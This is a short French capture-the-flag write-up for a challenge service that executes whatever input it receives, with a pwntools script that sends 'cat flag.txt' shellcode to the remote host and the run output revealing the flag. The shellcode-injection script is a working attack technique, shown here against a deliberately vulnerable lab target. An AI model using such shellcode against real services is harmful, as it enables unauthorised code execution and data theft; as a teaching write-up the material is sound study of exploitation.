# WriteUp

Le texte du challenge nous indique que le totem exécute tout ce que l'on lui dit.
Il semblerait donc qu'il y ait une évaluation de l'entrée utilisateur.

Il suffit donc de se connecter au service et d'y insérer son shellcode (ici un 'cat flag.txt') :
```python
from pwn import *

# Architecture cible x64
context.clear(arch="amd64")

# Connexion au service
p = remote("challenges.hackagou.nc", 5001)

# Shellcode classique, cat flag.txt
shellcode = asm(shellcraft.cat('flag.txt'))

# Envoi du shellcode directement après la sortie du programme
p.sendlineafter(b"?\n", shellcode)

# Sortie interactive
p.interactive()
```

```bash
❯ python pwn-paroles.py
[+] Opening connection to 127.0.0.1 on port 5001: Done
[*] Switching to interactive mode
OPENNC{13_Gu3rR13r_p4r13_54n5_R3gr37!}
[*] Got EOF while reading in interactive
```
